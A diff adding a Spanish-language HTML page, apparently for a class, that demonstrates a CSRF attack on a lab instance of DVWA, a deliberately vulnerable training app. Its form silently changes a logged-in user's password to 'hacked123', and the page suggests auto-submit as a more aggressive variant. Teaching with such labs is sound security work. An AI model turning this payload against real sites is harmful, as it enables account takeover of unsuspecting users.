@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>CSRF Demo — DVWA</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 720px;
+      margin: 2rem auto;
+      padding: 0 1rem;
+      line-height: 1.5;
+    }
+    form {
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 1rem;
+      background: #fafafa;
+    }
+    label {
+      display: block;
+      margin-top: 0.8rem;
+      font-weight: 600;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 0.6rem;
+      margin-top: 0.25rem;
+      box-sizing: border-box;
+    }
+    button {
+      margin-top: 1rem;
+      padding: 0.7rem 1rem;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+    code {
+      background: #f1f1f1;
+      padding: 0.15rem 0.3rem;
+    }
+    .warning {
+      color: #8a1c1c;
+      font-weight: 700;
+    }
+  </style>
+</head>
+<body>
+  <h1>Demo simple de CSRF contra DVWA</h1>
+
+  <p>
+    Esta página fuerza un request al módulo <code>CSRF</code> de DVWA para cambiar la contraseña
+    de un usuario que <strong>ya está logueado</strong>.
+  </p>
+
+  <p class="warning">
+    Requisito: tener DVWA abierto, autenticado y en nivel <code>Low</code>.
+  </p>
+
+  <form
+    action="https://dvwa.labs.manuel-roldan.cloud/vulnerabilities/csrf/"
+    method="GET"
+    target="csrf-result">
+
+    <label for="password_new">Nueva contraseña</label>
+    <input id="password_new" name="password_new" type="text" value="hacked123">
+
+    <label for="password_conf">Confirmar contraseña</label>
+    <input id="password_conf" name="password_conf" type="text" value="hacked123">
+
+    <input type="hidden" name="Change" value="Change">
+
+    <button type="submit">Lanzar CSRF</button>
+  </form>
+
+  <p>
+    Si querés hacerlo todavía más agresivo, podés agregar auto-submit en el <code>body</code>
+    o en un <code>script</code>, pero para clase suele ser mejor dispararlo con botón.
+  </p>
+
+  <iframe
+    name="csrf-result"
+    title="Resultado CSRF"
+    style="width:100%; height:260px; border:1px solid #ddd; margin-top:1rem;"></iframe>
+</body>
+</html>
